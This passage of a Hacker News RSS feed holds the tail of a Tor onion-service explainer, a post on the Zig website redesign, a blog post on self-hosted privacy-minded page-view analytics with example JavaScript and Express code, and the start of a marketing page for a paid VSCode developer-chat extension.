not extensible. V2 onions are vulnerable to harvesting by malicious HSDirs, and these malicious HSDirs exist today (and are removed as soon as they are detected).
Support for v2 onion services will be removed from Tor soon. V3 onions are the
future despite the current events.</p>

<h2><a name="index9h2"></a>Fallback directory mirror / fallback dir</h2>

<p>Tor clients don't usually <em>directly</em> fetch consensus information from a dirauth
anymore. There's too many people using Tor and only 9 dirauths. Instead, a
large number of relays that are high quality have opted in to also be hardcoded
into Tor source code so clients can usually fetch consensus data from them on
first run. After first run and successful connection to Tor, clients get this
stuff from their guard instead.</p>

<h2><a name="index10h2"></a>Consensus</h2>

<p>The dirauths vote on what relays are currently in the network and what certain network
parameters should be set to. The "average" of their votes become the consensus.
They make a consensus every hour and each is valid for three hours. Clients typically
fetch a new consensus every two hours.</p>

<p>You can see information from the current consensus <a href="https://consensus-health.torproject.org/">here</a>. Recent consensuses
are archived <a href="https://metrics.torproject.org/collector/recent/relay-descriptors/consensuses/">here</a>
and older ones archived <a href="https://metrics.torproject.org/collector/archive/relay-descriptors/consensuses/">here</a>.</p>



</section>









</div>



</article></div>]]>
            </description>
            <link>https://matt.traudt.xyz/posts/tracking-tors-network-wide-v3-onion-service-outages</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774167</guid>
            <pubDate>Thu, 14 Jan 2021 09:34:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The First Zig Website Redesign]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25774158">thread link</a>) | @pron
<br/>
January 14, 2021 | https://kristoff.it/blog/first-zig-website-redesign/ | <a href="https://web.archive.org/web/*/https://kristoff.it/blog/first-zig-website-redesign/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Up until the publication of this post, if you went to the front page of <a href="https://ziglang.org/" target="_blank" rel="nofollow noopener noreferrer">https://ziglang.org</a>, you would be greeted with a multi-page explanation about how Zig improves over the systems programming toolchains that today we take for granted.</p>
<p>If you have done enough of that kind of programming, you’ll immediately see how Zig is tackling relevant problems, but if you don’t have such experience, then the front page could very easily look like a never-ending list of things you don’t have an opinion about.</p>
<figure>
    <span>
      <a href="https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/bb7a5/old-zig-website.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/f5e3c/old-zig-website.webp 100w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/f2fbe/old-zig-website.webp 200w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/e227a/old-zig-website.webp 400w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/965c5/old-zig-website.webp 600w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/0cbce/old-zig-website.webp 800w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/823bd/old-zig-website.webp 2016w" sizes="(max-width: 400px) 100vw, 400px" type="image/webp">
        <source srcset="https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/c0399/old-zig-website.png 100w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/9ec3c/old-zig-website.png 200w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/c7805/old-zig-website.png 400w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/34e8a/old-zig-website.png 600w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/8ff1e/old-zig-website.png 800w,
https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/bb7a5/old-zig-website.png 2016w" sizes="(max-width: 400px) 100vw, 400px" type="image/png">
        <img src="https://kristoff.it/static/534b1bc1bc6f429e8bf3182eb5230216/c7805/old-zig-website.png" alt="The original homepage" title="The original homepage featured a pretty big ToC">
      </picture>
  </a>
    </span>
    <figcaption>The original homepage featured a pretty big ToC</figcaption>
  </figure>
<p>When the Zig project started, its audience was almost exclusively people with a lot of relevant experience, since those would be the only ones able to evaluate the promise and limits of the newborn language.</p>
<p>Today we’re at a point where Zig is becoming increasingly compelling for people coming from all layers of the stack. People have written <a href="https://github.com/Hejsil/mecha" target="_blank" rel="nofollow noopener noreferrer">parser combinators</a>, <a href="https://github.com/prime31/zig-gamekit" target="_blank" rel="nofollow noopener noreferrer">2d game rendering libraries</a>, <a href="https://www.mattkeeter.com/projects/futureproof/" target="_blank" rel="nofollow noopener noreferrer">a live editor for GPU shaders</a>, and much more. </p>
<figure>
    <span>
      <a href="https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/6ff5e/seascape-futureproof.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/f5e3c/seascape-futureproof.webp 100w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/f2fbe/seascape-futureproof.webp 200w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/e227a/seascape-futureproof.webp 400w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/965c5/seascape-futureproof.webp 600w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/0cbce/seascape-futureproof.webp 800w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/6bc95/seascape-futureproof.webp 1200w" sizes="(max-width: 400px) 100vw, 400px" type="image/webp">
        <source srcset="https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/c0399/seascape-futureproof.png 100w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/9ec3c/seascape-futureproof.png 200w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/c7805/seascape-futureproof.png 400w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/34e8a/seascape-futureproof.png 600w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/8ff1e/seascape-futureproof.png 800w,
https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/6ff5e/seascape-futureproof.png 1200w" sizes="(max-width: 400px) 100vw, 400px" type="image/png">
        <img src="https://kristoff.it/static/95e0e4b253811f7ad42c415ffd4d13bb/c7805/seascape-futureproof.png" alt="Futureproof, a live editor for GPU shaders" title="Futureproof, a live editor for GPU shaders">
      </picture>
  </a>
    </span>
    <figcaption>Futureproof, a live editor for GPU shaders</figcaption>
  </figure>
<p>Don’t get me wrong: all these projects have been developed by early adopters who wanted to try <a href="https://www.merriam-webster.com/dictionary/buggy" target="_blank" rel="nofollow noopener noreferrer">a new and exciting</a> ecosystem. Zig is not yet stable, and won’t be for a while, but we’re getting there, and in the meantime Zig is already delivering big time on at least one promise: <strong>making it possible to learn more about programming without having to first buy into vast amounts of accidental complexity</strong>.</p>
<p>This redesign had two main goals and, as always, a few practical constraints. When it comes to constraints, it’s mostly my web design and project management skills, and the scope that can be addressed in no more than a couple of months, since we needed a new website <em>now</em> and not one year from now. Let’s now take a look at the goals.</p>
<h2 id="a-friendlier-first-impression"><a href="#a-friendlier-first-impression" aria-label="a friendlier first impression permalink"></a>A friendlier first impression</h2>
<p>The first goal addressed stems directly from the introduction of this blog post: we wanted to make the website more appealing to people that are looking at Zig as an opportunity to learn more about programming. For this reason, the lengthy breakdown has been moved to the Learn section and, in its place, we now have three short paragraphs that highlight some of Zig’s major features, followed by a code sample that gives you a first taste of the syntax. </p>
<p>Above the main introduction we still have the same slogan as before:</p>
<blockquote>
<p>Zig is a general-purpose programming language and toolchain for maintaining <strong>robust</strong>, <strong>optimal</strong>, and <strong>reusable</strong> software.</p>
</blockquote>
<p>Andrew did an outstanding job at formulating it and I believe it’s the one bit of the entire website that should probably never change.</p>
<p>Next to the slogan there’s a new cluster of buttons. This is where I wanted to come up with an interesting compromise: we follow the popular trend of putting a big call to action for new users, but we also use that block of space to create a single hotspot where regulars can get access to critical information. </p>
<figure>
    <span>
      <a href="https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/af83c/button-cluster.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/f5e3c/button-cluster.webp 100w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/f2fbe/button-cluster.webp 200w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/e227a/button-cluster.webp 400w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/a9736/button-cluster.webp 552w" sizes="(max-width: 400px) 100vw, 400px" type="image/webp">
        <source srcset="https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/c0399/button-cluster.png 100w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/9ec3c/button-cluster.png 200w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/c7805/button-cluster.png 400w,
https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/af83c/button-cluster.png 552w" sizes="(max-width: 400px) 100vw, 400px" type="image/png">
        <img src="https://kristoff.it/static/14fc54ffd1ae3940e6e81fe6b1532e61/c7805/button-cluster.png" alt="The new button cluster" title="The new button cluster">
      </picture>
  </a>
    </span>
    <figcaption>The new button cluster</figcaption>
  </figure>
<p>My hope is for the big button to make new visitors become aware of that block and that, over time, checking there for docs and new releases just becomes muscle memory. That said, I know we’ll have to tweak the design once the auto-generated docs for the standard library become good enough for the front page.</p>
<p>Below everything I just described, we introduce the community and the Zig Software Foundation. The Zig project has grown to a point where governance matters and we want to show we’re doing everything the right way, up to the point of having formed a <a href="https://ziglang.org/zsf/" target="_blank" rel="nofollow noopener noreferrer">nonprofit organization with a clear scope and mission statement</a>.</p>
<h2 id="internationalization"><a href="#internationalization" aria-label="internationalization permalink"></a>Internationalization</h2>
<p>The second goal of this redesign was to open the door to hosting multiple translations of the website. Having an i18n-enabled website is beneficial for multiple reasons: it helps with the first goal (i.e. help a wider range of programmers get started with Zig), it’s a good way of getting more use out of the informative materials we’ll progressively add to the website, and it’s also well aligned with the mission of the Zig Software Foundation. Lastly, I’m personally invested in the idea that we must ensure we don’t leave it to third parties to be the sole owners of all content available in a given language, as we’ve already seen bad actors exploit their position to implement a form of cultural arbitrage.</p>
<p>We’re well aware that keeping up with translations to multiple languages can quickly become an effort black hole. For this reason, I’ve tried to make sure the tooling would help in making the process as smooth as possible (more on that later), and I’ve also made sure to clarify in the design how translations are community-provided and thus best-effort.</p>
<figure>
    <span>
      <a href="https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/c6a5f/translation-link.png" target="_blank" rel="noopener">
    <span></span>
  <picture>
        <source srcset="https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/f5e3c/translation-link.webp 100w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/f2fbe/translation-link.webp 200w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/e227a/translation-link.webp 400w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/965c5/translation-link.webp 600w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/0cbce/translation-link.webp 800w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/ffd30/translation-link.webp 1628w" sizes="(max-width: 400px) 100vw, 400px" type="image/webp">
        <source srcset="https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/c0399/translation-link.png 100w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/9ec3c/translation-link.png 200w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/c7805/translation-link.png 400w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/34e8a/translation-link.png 600w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/8ff1e/translation-link.png 800w,
https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/c6a5f/translation-link.png 1628w" sizes="(max-width: 400px) 100vw, 400px" type="image/png">
        <img src="https://kristoff.it/static/d2f40c1cc91417d645fdd614ae7aa9f5/c7805/translation-link.png" alt="Link present on all translated pages" title="Link present on all translated pages">
      </picture>
  </a>
    </span>
    <figcaption>Link present on all translated pages</figcaption>
  </figure>
<p>At the moment of publication, the website can only offer <a href="https://ziglang.org/translations/" target="_blank" rel="nofollow noopener noreferrer">an Italian translation</a> written by me. Italian was chosen out of necessity (i.e. it’s the only other language I speak), but it served the purpose of making me try out the ergonomics of producing a translation, and it can also act as documentation for others.</p>
<p>Finally, I should point out that there are some parts of the website we don’t plan to translate, like the News section, for example. This is another choice made out of necessity: we want to restrict translations to content with a long shelf life to reduce the amount of effort, but I don’t exclude that one day we might have enough resources to get rid of this compromise.</p>
<h2 id="implementation-details"><a href="#implementation-details" aria-label="implementation details permalink"></a>Implementation details</h2>
<p>The new website is statically generated by <a href="https://gohugo.io/" target="_blank" rel="nofollow noopener noreferrer">Hugo</a>. I also considered <a href="https://www.getzola.org/" target="_blank" rel="nofollow noopener noreferrer">Zola</a>, but its i18n support is not complete yet. The website lists a number of Zig code snippets, with relative output. Andrew originally implemented a program to produce release notes and language reference. That program takes in code samples, applies syntax highlighting, runs the code, and reports the output as HTML (it even retains colors from the terminal). I took the original code and packaged it as a tool with a more general interface. I called it <a href="https://github.com/kristoff-it/zig-doctest" target="_blank" rel="nofollow noopener noreferrer">zig-doctest</a> and it can be easily integrated with all kinds of static content generation tools.</p>
<p>Now a successful CI build of the <a href="https://github.com/ziglang/zig" target="_blank" rel="nofollow noopener noreferrer">ziglang/zig</a> repository triggers a build of the website, allowing us to catch outdated code examples much more easily. This addresses concerns raised in the past by people that would occasionally stumble upon a broken code sample.</p>
<p>Testing all code snippets is not instant as some tests include running the executable and capturing its output, so I made sure to integrate with Hugo’s caching system. I also noticed that Hugo processes tags sequentially within the same page, so I also <a href="https://github.com/kristoff-it/hugo" target="_blank" rel="nofollow noopener noreferrer">added to it</a> a warmup routine that makes sure to parallelize the testing when loading the development server the first time.</p>
<p>The result is a very enjoyable development experience that only depends on Zig and two additional executables (Hugo and doctest) to be able to develop the Zig website locally, resulting in an acceptable experience for potential contributors. </p>
<h2 id="conclusion"><a href="#conclusion" aria-label="conclusion permalink"></a>Conclusion</h2>
<p>I hope this post explains adequately the intent of this work and the practical limits of its execution. There’s still more work to do, but this seems a reasonable milestone for a first release, so I’m looking forward to working alongside the community to improve and add translations to the website.</p>
<p>For the next iteration I’ll work on improving accessibility, but first I have to focus on <a href="https://fosdem.org/2021/schedule/track/zig_programming_language/" target="_blank" rel="nofollow noopener noreferrer">FOSDEM, since we have a Zig dev room</a> and I have a bunch of duties to attend to. </p>
<p>When I first discovered Zig, I saw it as a way for me to learn more about all the aspects of programming I missed when working with interpreted and/or garbage-collected languages. Turns out I got to learn that <a href="https://ziglang.org/news/announcing-zig-software-foundation/" target="_blank" rel="nofollow noopener noreferrer">and much more</a>, and I can’t tell you how excited I am about what’s to come. Despite everything, 2020 was a great year for Zig, and I fully expect 2021 to be even better.</p></div></div>]]>
            </description>
            <link>https://kristoff.it/blog/first-zig-website-redesign/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774158</guid>
            <pubDate>Thu, 14 Jan 2021 09:33:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I removed Google Analytics and still have good data to analyze]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25773775">thread link</a>) | @fagnerbrack
<br/>
January 14, 2021 | http://tnickel.de/2020/12/24/2020-12-How-I-replaced-google-analytics-on-my-website/ | <a href="https://web.archive.org/web/*/http://tnickel.de/2020/12/24/2020-12-How-I-replaced-google-analytics-on-my-website/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" itemscope="" itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header>
  
  <p>
    <time datetime="2020-12-24T03:38:37.000Z" itemprop="datePublished"> Published 2020-12-24</time>
    
  </p>
</header>
	<div>
		
		<p>How I removed google analytics and still have good data to analyze. It was just recently, that I opened my google analytics account and added it to this website. I wanted to get some insights, about my website’s visitors. But compared to the google search console, there was not much information interesting to me. </p>
<p>And actually I worried a little. Is it legal to just add analytics? analytics was easy to add, just adding a script tag into my page. In EU it is needed to inform the user about non essential cookies. Before setting one, it is needed to ask the users consent. However, analytics got added using a static html tag and there is no way to control what cookies are set immediately.</p>
<p>I was not sure if I should create that script tag dynamically after asking the user, using some client side javascript. and would analytics still work?</p>
<p>On the internet when searching for analytics without cookies there are many websites advising to use <code>motomo</code>. It is a very good solution made with php and mysql. But for my little blog setting up this server seem a little to much. Also because I would have to look that I keep it up do date and do some more security measures. For real production application, google analytics and <a href="https://matomo.org/" rel="nofollow" target="_blank">motomo</a>, both will be a better choice recording lots of data you don’t know now you want to have in the future.</p>
<p>I added a little script into my website. Instead of cookies it uses local storage. local storage can not be used to track users across other websites. So I think this should comply with the law. Also in the storage there is nothing stored to identify the user.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></pre></td><td><pre><span></span><br><span></span><br><span><span>const</span> lastViewTime = <span>parseInt</span>(<span>localStorage</span>.getItem(<span>'lastViewTime'</span>)) || <span>0</span>;</span><br><span><span>const</span> viewCount = <span>parseInt</span>(<span>localStorage</span>.getItem(<span>'viewCount'</span>)) || <span>0</span>;</span><br><span><span>const</span> lastViewPage = <span>localStorage</span>.getItem(<span>'lastViewedPage'</span>) || <span>''</span>;</span><br><span></span><br><span><span>localStorage</span>.setItem(<span>'lastViewTime'</span>, <span>Date</span>.now())</span><br><span><span>localStorage</span>.setItem(<span>'viewCount'</span>, viewCount+<span>1</span>)</span><br><span><span>localStorage</span>.setItem(<span>'lastViewedPage'</span>, <span>document</span>.location.href);</span><br><span></span><br><span>fetch(<span>'/api/pageViews'</span>, {</span><br><span>  method: <span>'POST'</span>,</span><br><span>  headers: {</span><br><span>    <span>'Content-Type'</span>: <span>'application/json'</span></span><br><span>  },</span><br><span>  body: <span>JSON</span>.stringify({</span><br><span>    page: <span>document</span>.location.href,</span><br><span>    viewCount,</span><br><span>    time: <span>Date</span>.now(),</span><br><span>    lastViewTime: lastViewTime,</span><br><span>    lastViewPage: lastViewPage,</span><br><span>    userLanguage: navigator.language,</span><br><span>    userAgent: navigator.userAgent,</span><br><span>    referrer: <span>document</span>.referrer,</span><br><span>    dayTime: <span>parseInt</span>(req.body.dayTime+<span>''</span>),</span><br><span>  })</span><br><span>})  </span><br><span>  .then( <span><span>r</span> =&gt;</span> r.json())</span><br><span>  .then(<span><span>data</span> =&gt;</span> <span>console</span>.log(<span>'pageViewResult:'</span>, data);</span><br><span></span><br></pre></td></tr></tbody></table></figure>
<p>On the server I just dump this information into a jsonl file, meaning one json log entry each line. It can easily be converted to csv for analyses via <code>excel</code>. Draw some charts or count per interval weekly and monthly interval. </p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></pre></td><td><pre><span><span>const</span> router = <span>require</span>(<span>'express'</span>).Router();</span><br><span><span>module</span>.export.pageViewRouter = router;</span><br><span></span><br><span><span>const</span> file = fs.createWriteStream(fileName, {</span><br><span>  flags: <span>'a'</span> </span><br><span>});</span><br><span></span><br><span>router.post(<span>'/api/pageViews'</span>,<span>async</span> (req,res) =&gt; {</span><br><span>  res.json(<span>true</span>);</span><br><span>  file.write(<span>JSON</span>.stringify({</span><br><span>    page: body.page,</span><br><span>    time: <span>Date</span>.now(),</span><br><span>    userLanguage: (req.body.userLanguage+<span>''</span>).substr(<span>0</span>,<span>500</span>),</span><br><span>    userAgent: userAgent.id,</span><br><span>    viewCount: <span>parseInt</span>(req.body.viewCount),</span><br><span>    lastViewTime: <span>parseInt</span>(req.body.lastViewTime+<span>''</span>),</span><br><span>    lastViewPage: req.body.lastViewPage,</span><br><span>    referrer: req.body.referrer,</span><br><span>    dayTime: <span>new</span> <span>Date</span>().getHours()</span><br><span>  })+<span>'\n'</span>, <span>(<span>err</span>)=&gt;</span>{</span><br><span>    <span>if</span>(err) <span>console</span>.log(err)</span><br><span>  });</span><br><span>});</span><br></pre></td></tr></tbody></table></figure>

<p>Do you see, that I do not check if the browser supports the <code>fetch</code> API and modern arrow functions? I was thinking about it, and decided that I don’t need to care about old browser compatibility for this optional feature.</p>
<p>You see all the fields that are getting stored. These are what I came up with. That I think are interesting. To be honest, the API shown is not exactly the one running at tnickel.de, but the concept is this. On my running implementation I validate the received data, store urls and user agent string into a separate <a href="http://tnickel.de/2020/11/20/2020-11-rapid-prototyping-with-json-file-database/">json file database</a> and write the id into the log file. But with this example you can understand how you can implement the server side yourself.</p>
<p>As by chance: The dev.to community, was just asked about analytics tools. And I described my little solution. The <a target="_blank" rel="noopener" href="https://dev.to/madza/what-web-analytics-tools-do-you-use-458o">comment</a> received a reply by <a target="_blank" rel="noopener" href="https://charanj.it/">Charanjit Chana</a>, saying he is using a similar solution, here is what I found on his websites source code (it was minified, so I formatted it a little):</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span><span><span>function</span> <span>allowedToTrack</span>(<span></span>) </span>{</span><br><span>  <span>return</span> !(<span>window</span>.doNotTrack || navigator.doNotTrack || navigator.msDoNotTrack || <span>window</span>.external &amp;&amp; <span>"msTrackingProtectionEnabled"</span> <span>in</span> <span>window</span>.external) || <span>"1"</span> != <span>window</span>.doNotTrack &amp;&amp; <span>"yes"</span> != navigator.doNotTrack &amp;&amp; <span>"1"</span> != navigator.doNotTrack &amp;&amp; <span>"1"</span> != navigator.msDoNotTrack &amp;&amp; !<span>window</span>.external.msTrackingProtectionEnabled()</span><br><span>}</span><br><span><span>if</span> (allowedToTrack()) {</span><br><span>  <span>let</span> o = <span>Math</span>.floor(<span>8999999</span> * <span>Math</span>.random()) + <span>1e6</span>;</span><br><span>  <span>let</span> n = <span>window</span>.innerHeight + <span>"x"</span> + <span>window</span>.innerWidth; </span><br><span>  </span><br><span>  fetch(<span>"https://123.charanj.it/xyz/api/"</span> + o + <span>"/false/"</span> + n);</span><br><span>}</span><br><span></span><br><span><span>if</span> (<span>void</span> <span>0</span> !== <span>console</span>) {</span><br><span>  <span>console</span>.log(<span>"%c👋 Hey!"</span>, <span>"font-size: 16px; font-weight: 600"</span>);</span><br><span>  <span>console</span>.log(<span>"%cIf you can see this I would love to hear from you."</span>, <span>"font-size: 16px;"</span>);</span><br><span>  <span>console</span>.log(<span>"%cYou can find me at https://twitter.com/cchana."</span>, <span>"font-size: 16px;"</span>);</span><br><span>  <span>console</span>.log(<span>"%cUse the hashtag #cchanaconsole"</span>, <span>"font-size: 16px;"</span>);</span><br><span>  <span>console</span>.log(<span>"%c🤙 🖖"</span>, <span>"font-size: 16px;"</span>);</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>
<p>Seems as head of development he is interested in finding new developer talents for his team. I like the <code>allowToTrack</code> function used before the analytics request is made. This request then set a cookie, so multiple page views can be related to the same user and session. I don’t know about the rules in England after it left the EU, but I believe in Germany, an additional popup banner would be needed. Other than me, Charanjit is interested in the users screen resolution to know what to optimize the page for.</p>
<p>You now have seen two valid approaches to building the client side for collecting analytics information. With this article, I hope you find how how this website does analytics, without tracing the users all over the internet and even into their darkest dreams.</p>
  
	</div>
		

   	       
	</article>
	
<nav>
  
  
  
  
  
  
</nav>

	



</div></div>]]>
            </description>
            <link>http://tnickel.de/2020/12/24/2020-12-How-I-replaced-google-analytics-on-my-website/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773775</guid>
            <pubDate>Thu, 14 Jan 2021 08:41:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Developers Experts Chat on VScode]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25773743">thread link</a>) | @atoz2020
<br/>
January 14, 2021 | https://xscode.com/vscode-extension/ | <a href="https://web.archive.org/web/*/https://xscode.com/vscode-extension/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-elementor-type="wp-page" data-elementor-id="1613" data-elementor-settings="[]"><div><div><section data-id="b2399c6" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div><div><div data-id="592ffd41" data-element_type="column"><div><div><div data-id="adaf7e7" data-element_type="widget" data-widget_type="text-editor.default"><div><p>Get instant chat support from the world’s best open source developers, while Coding in VSCode.</p></div></div><section data-id="1448af4" data-element_type="section"></section></div></div></div></div></div></section><section data-id="b246335" data-element_type="section"><div><div><div data-id="fe0fedc" data-element_type="column"><div><div><div data-id="3423e03" data-element_type="widget" data-widget_type="html.default"><p><a href="https://www.producthunt.com/posts/xs-code-aces-for-vscode?utm_source=badge-featured&amp;utm_medium=badge&amp;utm_souce=badge-xs-code-aces-for-vscode" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=280111&amp;theme=light" alt="xs:code Aces for VSCode - Instant chat support from ace developers directly in VSCode | Product Hunt" width="250" height="54" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20250%2054'%3E%3C/svg%3E"></a></p></div><div data-id="d38f353" data-element_type="widget" data-widget_type="heading.default"><p><h2>Solve coding problems - while coding</h2></p></div><div data-id="660206e" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>Connect with over 850,000 Ace developers, who create and maintain the world’s top open source projects.&nbsp;</span><span>An expert’s advice on any language, framework or development issue, is a click away, right inside VSCode.</span></p></div></div></div></div></div></div><div data-id="7a5a986" data-element_type="column"><div><div><div data-id="50f4800" data-element_type="widget" data-widget_type="image.default"><div><p><img width="1200" height="1000" src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2.png" alt="" srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-768x640.png 768w" sizes="100vw" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201200%201000'%3E%3C/svg%3E" data-lazy-srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-768x640.png 768w" data-lazy-src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2.png"></p></div></div></div></div></div></div></div></section><section data-id="f66f4e0" data-element_type="section"><div><div><div data-id="1202725" data-element_type="column"><div><div><div data-id="cd08c8b" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>xs:code Aces for VSCode connects you with Ace open source developers who are ready to provide paid support for any coding issue. Start a chat, explain your problem, and get an offer. Offers start at $5.</p><p>Paid support is available at the discretion and responsibility of the developers offering it.</p></div></div></div><div data-id="a2b8c67" data-element_type="widget" data-widget_type="image.default"><div><p><img width="720" height="405" src="https://blog.xscode.com/wp-content/uploads/2021/01/aces-gif-full.gif" alt="" sizes="100vw" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20720%20405'%3E%3C/svg%3E"></p></div></div></div></div></div></div></div></section><section data-id="b6e5012" data-element_type="section"><div><div><div data-id="a412587" data-element_type="column"><div><div><div data-id="ae54b7c" data-element_type="widget" data-widget_type="image.default"><div><p><img width="1200" height="1000" src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2.png" alt="" srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-768x640.png 768w" sizes="100vw" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201200%201000'%3E%3C/svg%3E" data-lazy-srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-300x250.png 300w, 